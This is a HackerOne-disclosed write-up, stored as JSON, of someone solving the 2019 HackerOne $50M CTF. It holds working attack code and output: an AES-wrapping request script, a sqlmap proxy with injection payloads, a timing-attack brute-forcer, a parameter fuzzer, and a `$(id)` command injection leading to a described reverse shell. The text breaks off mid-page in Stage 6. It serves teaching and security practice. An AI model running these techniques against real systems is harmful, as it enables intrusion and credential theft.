{"id":508011,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MDgwMTE=","url":"https://hackerone.com/reports/508011","title":"CTF Writeup - c8889970d9fb722066f31e804e351993","state":"Closed","substate":"resolved","severity_rating":"none","readable_substate":"Resolved","created_at":"2019-03-11T17:20:32.897Z","submitted_at":"2019-03-11T17:20:32.897Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"sampriti","url":"/sampriti","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":38489,"url":"https://hackerone.com/50m-ctf","handle":"50m-ctf","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/038/489/ff893443bc2ef278fa8f0cdb64fb2f2322c8bcb7_original./43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/489/ff893443bc2ef278fa8f0cdb64fb2f2322c8bcb7_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"50m-ctf","twitter_handle":null,"website":"https://hackerone.com/","about":null}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-04-08T15:55:17.109Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2019-04-08T15:55:08.541Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"CTF Code: c8889970d9fb722066f31e804e351993\n\nHackerOne $50M CTF Write-Up\n============\n\nI came across this [tweet](https://twitter.com/Hacker0x01/status/1100543680383832065) announcing the HackerOne CTF for invitations\nto the HackerOne event in Vegas during DEFCON. I tried searching for a URL for the CTF, but couldn't find anything online, so I assumed\nthat the first challenge was the tweet itself.\n\n{F439432}\n\nStage 1 - Steganography\n----------\n\nThe first thing that I noticed was the second image in the tweet with a lot of binary numbers.\n\n{F439431}\n\nAt first, I tried to write a script that would cut up the image evenly into images of around 20 pixels by 8 pixels to try to extract each digit,\nbut that didn't work out because the digits were not of uniform length.\n\nThen I tried to convert the first line by hand to see if I got something meaningful. I got the first 4 characters as `zlib` and then some binary\ndata, which was very difficult to obtain accurately, so I gave up on that method.\n\nLast, I tried to run the tool [zsteg](https://github.com/zed-0xff/zsteg) on the image, and it gave me a link hidden in the image.\n\n```sh\n$ zsteg -a D0XoThpW0AE2r8S.png\n...\n...\nb4,b,lsb,xy,prime   .. text: \"g`2Dc\u0026HEu\"\nb4,rgb,lsb,xy,prime .. text: \"k\\\"FPg\u0026uR\"\nb4,bgr,lsb,xy,prime .. text: \"62uGdubSw%\"\nb6,bgr,lsb,xy,prime .. text: \"YETYEWUU\"\nb7,b,msb,xy,prime   .. text: \"(4:M \u0026Q(42\"\nb1,rgb,lsb,yx       .. zlib: data=\"https://bit.do/h1therm\", offset=5, size=22\nb2,rgb,lsb,yx       .. file: PGP\\011Secret Sub-key -\nb3,r,lsb,yx         .. text: \"Q.L\\n4Af^\"\nb4,rgb,lsb,yx       .. text: \"|xKKznZb\"\nb7,g,msb,yx         .. text: \"rgZfcQD\u003c\"\nb8,r,lsb,yx         .. text: \"!6?727:3\"\n...\n...\n```\n\n\nStage 2 - APK Reversing\n--------\n\nThe `bit.do` link from the PNG redirected me to a [google drive link](https://drive.google.com/file/d/1u5Mg1xKJMrW4DMGaWtBZ1TJKPdvqCWdJ/view)\nwith a APK file called `h1thermostat.apk`.\n\nI loaded the apk file in a APK decompiler called [JADX](https://github.com/skylot/jadx) that gives us the Java source code for the Android app.\nInside JADX, I could see a overview of the various activities related to the Thermostat App.\n\n{F439433}\n\nInside the `ThermostatActivity` class, I found the `setDefaults` function, which appears to send the username, password and the command `getTemp`\nto some remote server using the `PayloadRequest` class.\n\n```java\n    private void setDefaults(final ThermostatModel thermostatModel) throws Exception {\n        thermostatModel.setTargetTemperature(Integer.valueOf(77));\n        thermostatModel.setCurrentTemperature(Integer.valueOf(76));\n        JSONObject jSONObject = new JSONObject();\n        jSONObject.put(\"username\", LoginActivity.username);\n        jSONObject.put(\"password\", LoginActivity.password);\n        jSONObject.put(\"cmd\", \"getTemp\");\n        volleyQueue.add(new PayloadRequest(jSONObject, new Listener\u003cString\u003e() {\n            public void onResponse(String str) {\n                thermostatModel.setTargetTemperature(Integer.valueOf(70));\n                thermostatModel.setCurrentTemperature(Integer.valueOf(73));\n            }\n        }));\n    }\n```\n\nFrom the `PayloadRequest` class, I found the URL of the remote server it sends the requests to. It also contained the details about the algorithm\nit uses to encrypt and decrypt communications between the app and the remote server.\n\n```java\n    public PayloadRequest(JSONObject jSONObject, final Listener\u003cString\u003e listener) throws Exception {\n        super(1, \"http://35.243.186.41/\", new ErrorListener() {\n            public void onErrorResponse(VolleyError volleyError) {\n                listener.onResponse(\"Connection failed\");\n            }\n        });\n        this.mListener = listener;\n        this.mParams.put(\"d\", buildPayload(jSONObject));\n    }\n\n    private String buildPayload(JSONObject jSONObject) throws Exception {\n        Key secretKeySpec = new SecretKeySpec(new byte[]{(byte) 56, (byte) 79, (byte) 46, (byte) 106, (byte) 26, (byte) 5, (byte) -27, (byte) 34, (byte) 59, Byte.MIN_VALUE, (byte) -23, (byte) 96, (byte) -96, (byte) -90, (byte) 80, (byte) 116}, \"AES\");\n        Object obj = new byte[16];\n        new SecureRandom().nextBytes(obj);\n        AlgorithmParameterSpec ivParameterSpec = new IvParameterSpec(obj);\n        Cipher instance = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\n        ...\n        ...\n```\n\nThe AES key is a hardcoded 16-byte key, and the algorithm used is AES in CBC mode with PKCS5 Padding and a Random IV. I wrote a simple script in Java to\nconvert the key to unsigned bytes that can be used easily with a AES library.\n\n```java\nimport java.io.*;\n\nclass Ideone\n{\n  public static void main (String[] args) throws java.lang.Exception\n  {\n    byte[] key = new byte[]{(byte) 56, (byte) 79, (byte) 46, (byte) 106, (byte) 26, (byte) 5, (byte) -27, (byte) 34, (byte) 59, Byte.MIN_VALUE, (byte) -23, (byte) 96, (byte) -96, (byte) -90, (byte) 80, (byte) 116};\n    for(int i = 0; i \u003c 16; i++) {\n      System.out.print(key[i] \u0026 0xff);\n      if(i \u003c 15) System.out.print(\", \");\n    }\n    System.out.println(\"\");\n  }\n}\n/*\nSuccess #stdin #stdout 0.04s 2184192KB\n56, 79, 46, 106, 26, 5, 229, 34, 59, 128, 233, 96, 160, 166, 80, 116\n*/\n```\n\nOnce I had the AES key, I then wrote a script in Ruby that would allow me to play around with the parameters to the API and see the response.\nIt took the username, password and command inputs, converted them to a JSON string, encrypted the string with AES and encoded it in base64 and sent\nit to the server. It then got the response from the server and decrypted it using the AES key and printed the response to the user.\n\n```rb\nrequire 'httparty'\nrequire 'base64'\nrequire 'openssl'\n\naes_key_arr = [56, 79, 46, 106, 26, 5, 229, 34, 59, 128, 233, 96, 160, 166, 80, 116]\nAES_KEY = aes_key_arr.map(\u0026:chr).join\n\ndef encrypt(msg)\n  cipher = OpenSSL::Cipher.new('AES-128-CBC').encrypt\n  cipher.key = AES_KEY\n  iv = cipher.random_iv\n  encrypted = cipher.update(msg) + cipher.final\n  iv + encrypted\nend\n\ndef decrypt(msg)\n  cipher = OpenSSL::Cipher.new('AES-128-CBC').decrypt\n  cipher.key = AES_KEY\n  iv = msg[0...16]\n  data = msg[16..-1]\n  cipher.iv = iv\n  plain = cipher.update(data) + cipher.final\nend\n\ndata = {\"username\" =\u003e ARGV[0], \"password\" =\u003e ARGV[1], \"cmd\" =\u003e ARGV[2]}.to_json\nencrypted_data = Base64.strict_encode64(encrypt(data))\nencrypted_resp = HTTParty.post(\"http://35.243.186.41/\", body: {\"d\" =\u003e encrypted_data}).body\nresp = decrypt(Base64.strict_decode64(encrypted_resp))\nputs resp\n```\n\nAfter some tries with default credentials, I was able to get a successful response.\n\n```sh\n$ ruby remote.rb \"admin\" \"admin\" \"getTemp\"\n{\"success\": false, \"error\": \"Invalid username or password\"}\n$ ruby remote.rb \"admin\" \"password\" \"getTemp\"\n{\"temperature\": 73, \"success\": true}\n```\n\n\nStage 3 - SQL Injection\n------\n\nNow that I had a simple way to send requests to the remote, I tried some common SQL injection parameters on the username/password input fields.\n\n```sh\n$ ruby remote.rb \"admin'\" \"password\" \"getTemp\"\n{\"success\": false, \"error\": \"Unknown\"}\n$ ruby remote.rb \"admin\\\"\" \"password\" \"getTemp\"\n{\"success\": false, \"error\": \"Invalid username or password\"}\n$ ruby remote.rb \"admin' OR '1'='1\" \"password\" \"getTemp\"\n{\"temperature\": 73, \"success\": true}\n$ ruby remote.rb \"admin' OR '1'='0\" \"password\" \"getTemp\"\n{\"temperature\": 73, \"success\": true}\n$ ruby remote.rb \"admin' AND '1'='0\" \"password\" \"getTemp\"\n{\"success\": false, \"error\": \"Invalid username or password\"}\n```\n\nThis responses looked very much like a unsantized SQL query that could be exploited for SQL injection. Unfortunately it didn't seem like\nI could get much output from the remote except for success/failure. This led me to use SQLMap to exploit the injection as it has optimized scripts\nfor extracting data when only blind injection techniques are available.\n\nI couldn't directly use SQLMap here as the parameters are encrypted, so I used the script I wrote earlier to write a simple proxy server using Sinatra where SQLMap\ncan send it's normal POST requests, and the proxy server would encrypt the requests and forward them to the remote server and return the JSON response to\nSQLMap.\n\n```rb\nrequire 'sinatra'\nrequire 'open3'\n\npost '/submit' do\n  puts params\n  stdout, status = Open3.capture2('ruby', 'remote.rb', params[:username], params[:password], params[:cmd])\n  return stdout\nend\n```\n\nThen, I can just unleash SQLMap on this localhost server and it should do the job for me.\n\n```sh\n$ ruby sqlmap_proxy.rb\n[2019-03-11 09:00:22] INFO  WEBrick 1.4.2\n[2019-03-11 09:00:22] INFO  ruby 2.5.1 (2018-03-29) [x86_64-linux]\n== Sinatra (v2.0.5) has taken the stage on 4567 for development with backup from WEBrick\n[2019-03-11 09:00:22] INFO  WEBrick::HTTPServer#start: pid=18347 port=4567\n{\"username\"=\u003e\"admin\", \"password\"=\u003e\"admin\", \"cmd\"=\u003e\"getTemp\"}\n127.0.0.1 - - [11/Mar/2019:09:00:28 -0400] \"POST /submit HTTP/1.1\" 200 60 0.2152\n127.0.0.1 - - [11/Mar/2019:09:00:28 EDT] \"POST /submit HTTP/1.1\" 200 60\nhttp://localhost:4567/submit -\u003e /submit\n{\"username\"=\u003e\"admin\", \"password\"=\u003e\"admin\", \"cmd\"=\u003e\"getTemp\"}\n127.0.0.1 - - [11/Mar/2019:09:00:29 -0400] \"POST /submit HTTP/1.1\" 200 60 0.2290\n127.0.0.1 - - [11/Mar/2019:09:00:29 EDT] \"POST /submit HTTP/1.1\" 200 60\nhttp://localhost:4567/submit -\u003e /submit\n{\"username\"=\u003e\"9727\", \"password\"=\u003e\"admin\", \"cmd\"=\u003e\"getTemp\"}\n127.0.0.1 - - [11/Mar/2019:09:00:30 -0400] \"POST /submit HTTP/1.1\" 200 60 0.2360\n127.0.0.1 - - [11/Mar/2019:09:00:29 EDT] \"POST /submit HTTP/1.1\" 200 60\nhttp://localhost:4567/submit -\u003e /submit\n{\"username\"=\u003e\"admin\\\",'.((,)),\", \"password\"=\u003e\"admin\", \"cmd\"=\u003e\"getTemp\"}\n127.0.0.1 - - [11/Mar/2019:09:00:30 -0400] \"POST /submit HTTP/1.1\" 200 39 0.2095\n127.0.0.1 - - [11/Mar/2019:09:00:30 EDT] \"POST /submit HTTP/1.1\" 200 39\nhttp://localhost:4567/submit -\u003e /submit\n{\"username\"=\u003e\"admin'RnrsuZ\u003c'\\\"\u003eRCnItt\", \"password\"=\u003e\"admin\", \"cmd\"=\u003e\"getTemp\"}\n127.0.0.1 - - [11/Mar/2019:09:00:30 -0400] \"POST /submit HTTP/1.1\" 200 39 0.2091\n127.0.0.1 - - [11/Mar/2019:09:00:30 EDT] \"POST /submit HTTP/1.1\" 200 39\n...\n...\n...\n\n\n$ python sqlmap.py -u \"http://localhost:4567/submit\" --method=POST --data=\"username=admin\u0026password=admin\u0026cmd=getTemp\" --fingerprint --level 5 --risk 3\n        ___\n       __H__\n ___ ___[,]_____ ___ ___  {1.3.2.30#dev}\n|_ -| . [(]     | .'| . |\n|___|_  [)]_|_|_|__,|  _|\n      |_|V...       |_|   http://sqlmap.org\n\n\n[*] starting @ 09:00:28 /2019-03-11/\n\n[09:00:28] [INFO] testing connection to the target URL\n[09:00:28] [INFO] checking if the target is protected by some kind of WAF/IPS\n[09:00:29] [INFO] testing if the target URL content is stable\n[09:00:29] [INFO] target URL content is stable\n[09:00:29] [INFO] testing if POST parameter 'username' is dynamic\n[09:00:30] [WARNING] POST parameter 'username' does not appear to be dynamic\n[09:00:30] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable\n[09:00:30] [INFO] testing for SQL injection on POST parameter 'username'\n[09:00:30] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'\n[09:00:53] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'\n[09:01:11] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'\n[09:01:32] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'\n[09:01:34] [INFO] POST parameter 'username' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable\n[09:01:36] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL'\nit looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y\n...\n...\n...\nsqlmap identified the following injection point(s) with a total of 772 HTTP(s) requests:\n---\nParameter: username (POST)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)\n    Payload: username=admin' AND 9499=(SELECT (CASE WHEN (9499=9499) THEN 9499 ELSE (SELECT 1626 UNION SELECT 8715) END))-- IcWo\u0026password=admin\u0026cmd=getTemp\n\n    Type: AND/OR time-based blind\n    Title: MySQL \u003e= 5.0.12 AND time-based blind\n    Payload: username=admin' AND SLEEP(5)-- TrnU\u0026password=admin\u0026cmd=getTemp\n---\n[09:06:35] [INFO] testing MySQL\n[09:06:35] [INFO] confirming MySQL\n[09:06:36] [INFO] the back-end DBMS is MySQL\n[09:06:36] [INFO] actively fingerprinting MySQL\n[09:06:37] [INFO] executing MySQL comment injection fingerprint\nback-end DBMS: active fingerprint: MySQL \u003e= 5.5 (MariaDB fork)\n```\n\nNow we can dump the databases and tables.\n\n```\navailable databases [4]:\n[*] flitebackend\n[*] information_schema\n[*] mysql\n[*] performance_schema\n\nDatabase: flitebackend\n[2 tables]\n+---------+\n| devices |\n| users   |\n+---------+\n```\n\nDumping the data from the `users` table:\n\n```\nDatabase: flitebackend\nTable: users\n[2 entries]\n+----+----------+----------------------------------+\n| id | username | password                         |\n+----+----------+----------------------------------+\n| 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |\n| 2  | sevenate | c5b1d550b588178c4bb321069fb688ab |\n+----+----------+----------------------------------+\n```\n\nBoth the the hashes were easily found online to be `admin:password` and `sevenate:nine10`. However after playing around with the `cmd` parameter\nI realized that there wasn't much I could do besides call the `getTemp` and `setTemp` commands which I had found from the APK I had reversed earlier.\nSo I moved my focus to the `devices` table.\n\nThe `devices` table contained 151 IPs. I will post a truncated list of the table here. The complete list can be found here: https://pastebin.com/8T7kMede\n\n```\nDatabase: flitebackend\nTable: devices\n[151 entries]\n+-----+-----------------+\n| id  | ip              |\n+-----+-----------------+\n| 1   | 192.88.99.29    |\n| 2   | 192.88.99.117   |\n| 3   | 10.186.74.138   |\n| 4   | 192.88.99.20    |\n| 5   | 252.222.76.84   |\n| 6   | 241.192.235.227 |\n| 7   | 192.88.99.145   |\n| 8   | 192.88.99.150   |\n| 9   | 10.148.253.200  |\n| 10  | 254.15.165.28   |\n...\n...\n...\n| 140 | 10.55.194.248   |\n| 141 | 192.88.99.23    |\n| 142 | 248.104.65.126  |\n| 143 | 244.16.55.86    |\n| 144 | 251.243.170.236 |\n| 145 | 192.88.99.248   |\n| 146 | 192.88.99.55    |\n| 147 | 10.27.78.111    |\n| 148 | 253.200.157.207 |\n| 149 | 192.88.99.145   |\n| 150 | 192.88.99.189   |\n| 151 | 10.2.31.209     |\n+-----+-----------------+\n```\n\n\nMany of these looked like Private/Internal IPs. I decided to pass the list of IP addresses to nmap. As I'm on a university network,\nmany of those private IP addresses showed up as online with ports open to me. I removed all the IP address that started with 192.*\nbefore starting the scan\n\n```sh\n$ cat devices.csv | grep -v \"^192\" \u003e devices2.csv\n$ nmap -iL devices2.csv\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2019-03-11 14:04 UTC\nNmap scan report for 98.12.196.104.bc.googleusercontent.com (104.196.12.98)\nHost is up (0.019s latency).\nNot shown: 997 filtered ports\nPORT     STATE  SERVICE\n22/tcp   open   ssh\n80/tcp   open   http\n3389/tcp closed ms-wbt-server\n\nNmap done: 101 IP addresses (1 host up) scanned in 23.76 seconds\n```\n\nhttp://104.196.12.98 is the IP for a new server for FliteThermostat.\n\n\nStage 4 - Timing Attack\n----------\n\nWe are presented with another log-in screen this time. This time however, there is a client-side component to it. The JavaScript code in `login.js`\ncombines the username and password from the form into a 32-byte hash. I did not do proper cryptanalysis of the hash, however running some tests on it\nand going through the code pointed me towards the direction that the hash was destructive and it was not possible to recover the username and password from it.\n\nThis meant, it was pointless to try to SQL inject the username/password. I tried to SQL inject the hash parameter directly incase it was being compared with a hash in the database\nand spent a lot of time, trying different forms of injection.\n\nAfter a lot of failed attempts, I thought of trying a timing attack on the hash comparision similar to challenges I've seen in previous CTFs. I implemented a multi-threaded solution\nwith requests and threading in Python. There were a number of issues I faced:\n\n- The server rejects the hash if it is not of the right length (32 bytes).\n- I originally tried to bruteforce one hex character (4-bits) at a time, but the timing was too unreliable, so I had to switch to brute forcing 1 byte at a time.\n- If you used too many threads, the server would somehow slow down, and give you tons of false positives\n- On my final attempt to get the flag, the server went hay-wire after finding around 20 bytes, so I had to reduce the number of parallel workers from 64 to 4 which made the script very slow.\n\nThis was the final script I used:\n\n```py\nimport requests\nimport concurrent.futures\nimport time\n\ndef get_time(new_hash):\n    start = time.time()\n    req = requests.post('http://104.196.12.98/', data={'hash': new_hash})\n    elapsed = time.time() - start\n    return elapsed\n\ncurr_hash = \"\"\n\nfor i in range(len(curr_hash)//2, 32):\n    best_time = 0.0\n    best_byte = -1\n\n    with concurrent.futures.ThreadPoolExecutor(max_workers=64) as executor:\n        futures = []\n        for b in range(256):\n            new_hash = curr_hash + (\"%02x\" % b)\n            new_hash += '0' * (64 - len(new_hash))\n            futures.append(executor.submit(get_time, new_hash))\n\n        for b in range(256):\n            curr_time = futures[b].result()\n            if curr_time \u003e best_time:\n                best_time = curr_time\n                best_byte = b\n\n    assert best_byte != -1\n    fin_byte = \"%02x\" % best_byte\n    print('Found Byte {} with time {}'.format(fin_byte, best_time))\n    curr_hash += fin_byte\n    print(curr_hash)\n```\n\n```sh\n$ python brute_hash.py\nFound Byte f9 with time 1.0551841259002686\nf9\nFound Byte 86 with time 1.7021434307098389\nf986\nFound Byte 5a with time 2.191676139831543\nf9865a\nFound Byte 49 with time 2.6396777629852295\nf9865a49\nFound Byte 52 with time 3.056812286376953\nf9865a4952\nFound Byte a4 with time 3.6751813888549805\nf9865a4952a4\nFound Byte f5 with time 4.157867431640625\nf9865a4952a4f5\nFound Byte d7 with time 4.642802000045776\nf9865a4952a4f5d7\nFound Byte 4b with time 5.1769492626190186\nf9865a4952a4f5d74b\nFound Byte 43 with time 5.811188697814941\nf9865a4952a4f5d74b43\nFound Byte f3 with time 6.342976093292236\nf9865a4952a4f5d74b43f3\nFound Byte 55 with time 6.685908555984497\nf9865a4952a4f5d74b43f355\nFound Byte 8f with time 7.125741720199585\nf9865a4952a4f5d74b43f3558f\nFound Byte ed with time 7.686535358428955\nf9865a4952a4f5d74b43f3558fed\nFound Byte 6a with time 8.13300371170044\nf9865a4952a4f5d74b43f3558fed6a\nFound Byte 02 with time 8.572584390640259\nf9865a4952a4f5d74b43f3558fed6a02\nFound Byte 25 with time 9.127085447311401\nf9865a4952a4f5d74b43f3558fed6a0225\nFound Byte c6 with time 9.615064144134521\nf9865a4952a4f5d74b43f3558fed6a0225c6\nFound Byte 87 with time 10.174720764160156\nf9865a4952a4f5d74b43f3558fed6a0225c687\nFound Byte 7f with time 10.610665321350098\nf9865a4952a4f5d74b43f3558fed6a0225c6877f\nFound Byte ba with time 11.085944652557373\nf9865a4952a4f5d74b43f3558fed6a0225c6877fba\nFound Byte 60 with time 11.662947177886963\nf9865a4952a4f5d74b43f3558fed6a0225c6877fba60\nFound Byte a2 with time 12.160533905029297\nf9865a4952a4f5d74b43f3558fed6a0225c6877fba60a2\nFound Byte b1 with time 13.189836025238037\nf9865a4952a4f5d74b43f3558fed6a0225c6877fba60a2b1\nFound Byte 01 with time 12.254333019256592\nf9865a4952a4f5d74b43f3558fed6a0225c6877fba60a2b101\n^C\n$ python brute_hash.py\nFound Byte a2 with time 12.179362773895264\nf9865a4952a4f5d74b43f3558fed6a0225c6877fba60a2\nFound Byte 50 with time 12.572036743164062\nf9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250\nFound Byte bc with time 13.273049354553223\nf9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bc\nFound Byte bd with time 13.617496967315674\nf9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbd\nFound Byte e7 with time 14.13040566444397\nf9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde7\nFound Byte 53 with time 14.593729496002197\nf9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753\nFound Byte f5 with time 15.0700101852417\nf9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753f5\nFound Byte db with time 15.664264917373657\nf9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753f5db\nFound Byte 13 with time 16.164478063583374\nf9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753f5db13\nFound Byte d8 with time 16.67181408072168\nf9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753f5db13d8\n```\n\nTrying the hash on the website gives us the session cookie to login!\n\n```sh\n$ curl 'http://104.196.12.98/' --data \"hash=f9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753f5db13d8\" -vvv\n*   Trying 104.196.12.98...\n* TCP_NODELAY set\n* Connected to 104.196.12.98 (104.196.12.98) port 80 (#0)\n\u003e POST / HTTP/1.1\n\u003e Host: 104.196.12.98\n\u003e User-Agent: curl/7.58.0\n\u003e Accept: */*\n\u003e Content-Length: 69\n\u003e Content-Type: application/x-www-form-urlencoded\n\u003e\n* upload completely sent off: 69 out of 69 bytes\n\u003c HTTP/1.1 302 FOUND\n\u003c Server: nginx/1.15.8\n\u003c Date: Mon, 11 Mar 2019 15:48:54 GMT\n\u003c Content-Type: text/html; charset=utf-8\n\u003c Content-Length: 217\n\u003c Connection: keep-alive\n\u003c Location: http://104.196.12.98/main\n\u003c Cache-Control: public, max-age=0\n\u003c Pragma: no-cache\n\u003c Expires: 0\n\u003c Vary: Cookie\n\u003c Set-Cookie: session=eyJsb2dnZWRJbiI6dHJ1ZX0.XIaDZg.P26g9dbuNlBlDBMSxlqQ785TGiY; HttpOnly; Path=/\n\u003c\n\u003c!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\"\u003e\n\u003ctitle\u003eRedirecting...\u003c/title\u003e\n\u003ch1\u003eRedirecting...\u003c/h1\u003e\n* Connection #0 to host 104.196.12.98 left intact\n\u003cp\u003eYou should be redirected automatically to target URL: \u003ca href=\"/main\"\u003e/main\u003c/a\u003e.  If not click the link.\n```\n\n\nStage 5 - Command Injection\n------\n\nOnce we login, we're presented with a control panel for the thermostat with three links (one hidden).\n\n```html\n    \u003cli\u003e\u003ca href=\"/control\"\u003eTemperature control\u003c/a\u003e\u003c/li\u003e\n    \u003cli\u003e\u003ca href=\"/update\"\u003eCheck for updates\u003c/a\u003e\u003c/li\u003e\n    \u003c!--\u003cli\u003e\u003ca href=\"/diagnostics\"\u003eDiagnostics\u003c/a\u003e\u003c/li\u003e--\u003e\n```\n\nThe Temperature control allows us to set the temperature, which doesn't seem interesting. The Diagnostics page just returns forbidden,\nso that is something we might have to access through some other means. The most interesting page is the Update page. It outputs:\n\n```\nConnecting to http://update.flitethermostat:5000/ and downloading update manifest\n...\n...\n...\nCould not connect\n```\n\nThis points towards something similar to a SSRF, but we need to figure out how to control the parameters, i.e the URL and the port.\nAfter playing around a bit with the URL and the parameters, I discovered that `port` param in the GET request allows us to change the\nport that the server connects to. However, this didn't help that much as it was converted to an int in the backend, and if you sent a string,\nit would throw an Internal Server Error.\n\nI was stuck for a long time at this point, trying various parameter names, until I saw the tweet from Cody, which was an underscore. I figured that\nthe param that controlled the host might be two letter word joined by underscores. I wrote a script that used a\n[Burp Parameter Wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt) and tried all the different combinations\nuntil it found something that changed the URL.\n\n```py\nfrom requests_futures.sessions import FuturesSession\n\nsession = FuturesSession(max_workers=32)\n\nparams = open('burp-parameter-names.txt').read().strip().split()\ndefault_data = session.get('http://104.196.12.98/update', cookies={'session': 'eyJsb2dnZWRJbiI6dHJ1ZX0.XIaDZg.P26g9dbuNlBlDBMSxlqQ785TGiY'}).result().text\nprint(default_data)\n\nparam_requests = []\nN = len(params)\n\nfor i in range(N):\n    for j in range(i + 1):\n        p1 = params[i]\n        p2 = params[j]\n        curr = session.get('http://104.196.12.98/update?' + str(p1 + '_' + p2) + '=80', cookies={'session': 'eyJsb2dnZWRJbiI6dHJ1ZX0.XIaDZg.P26g9dbuNlBlDBMSxlqQ785TGiY'})\n        param_requests.append([p1 + '_' + p2, curr])\n        curr = session.get('http://104.196.12.98/update?' + str(p2 + '_' + p1) + '=80', cookies={'session': 'eyJsb2dnZWRJbiI6dHJ1ZX0.XIaDZg.P26g9dbuNlBlDBMSxlqQ785TGiY'})\n        param_requests.append([p2 + '_' + p1, curr])\n\n    for p, resp in param_requests:\n        res = resp.result()\n        print(res.url)\n        if res.text != default_data or res.status_code != 200:\n            print(p)\n            print()\n            print(res.status_code)\n            print()\n            print(res.text)\n            exit()\n\n    param_requests = []\n```\n\nAfter letting it run for a couple of minutes, it found the magic param: `update_host`.\n\nNow that I could control both the host and the port, I tried to point the update to localhost and try to access the\nforbidden diagnostics page. However, nothing seemed to be working. I also tried doing a port scan, but that didn't find anything as well.\n\nAfter giving up on SSRF, I tried doing a command injection, and that worked!\n\n```\n# http://104.196.12.98/update?update_host=127.0.0.1:$(id)/\nConnecting to http://127.0.0.1:uid=0(root) gid=0(root) groups=0(root)/:5000/ and downloading update manifest\n...\n...\n...\nCould not connect\n```\n\nUsing the command injection, I got a reverse shell back to my server, and searched through the system. The app was running in a docker container\nand I didn't find anything interesting except the source code of the app, where I found a number of red herrings ;)\n\nNext, I tried to scan the network that the docker instance was running on.\n\n```\nroot@b60da3a618c2:/app# ip a\n1: lo: \u003cLOOPBACK,UP,LOWER_UP\u003e mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n188: eth0@if189: \u003cBROADCAST,MULTICAST,UP,LOWER_UP\u003e mtu 1500 qdisc noqueue state UP group default\n    link/ether 02:42:ac:1b:00:03 brd ff:ff:ff:ff:ff:ff link-netnsid 0\n    inet 172.27.0.3/16 brd 172.27.255.255 scope global eth0\n       valid_lft forever preferred_lft forever\n\nroot@b60da3a618c2:/app# nmap 172.27.0.0/24\nStarting Nmap 7.40 ( https://nmap.org ) at 2019-03-11 16:16 UTC\nNmap scan report for 172.27.0.1\nHost is up (0.00011s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 02:42:DE:7A:10:86 (Unknown)\n\nNmap scan report for flitectf_accounting_1.flitectf_default (172.27.0.2)\nHost is up (0.00015s latency).\nNot shown: 999 closed ports\nPORT   STATE SERVICE\n80/tcp open  http\nMAC Address: 02:42:AC:1B:00:02 (Unknown)\n\nNmap scan report for b60da3a618c2 (172.27.0.3)\nHost is up (0.000010s latency).\nNot shown: 999 closed ports\nPORT   STATE SERVICE\n80/tcp open  http\n\nNmap done: 256 IP addresses (3 hosts up) scanned in 103.50 seconds\n```\n\nVisiting http://172.27.0.2 we come across a new service.\n\n\n\nStage 6 - Local File Inclusion\n------\n\n\nFirst I tried to set up a proxy so that I could access the website normally, and play around with it. To do this, I downloaded ngrok\nand reverse proxied the website to a publically accessible domain.\n\n```\nroot@b60da3a618c2:/tmp# ./ngrok http 172.27.0.2:80\nngrok by @inconshreveable            (Ctl+C to quit)\n\nngrok does not support a dynamic, color terminal UI on solaris.\nAccess the web interface for connection and tunnel status.\n\nVersion                       2.3.15\nRegion                        United States (us)\nWeb Interface                 http://127.0.0.1:4040\n```\n\nOn the website, there were two tabs: Invoices and Reports, both of which were protected by login.\nOn the Invoices page, there was a hidden link in the source to a page to create a new invoice.\n\n```html\n      \u003cli  class=\"nav-item\" \u003e\n        \u003ca class=\"nav-link\" 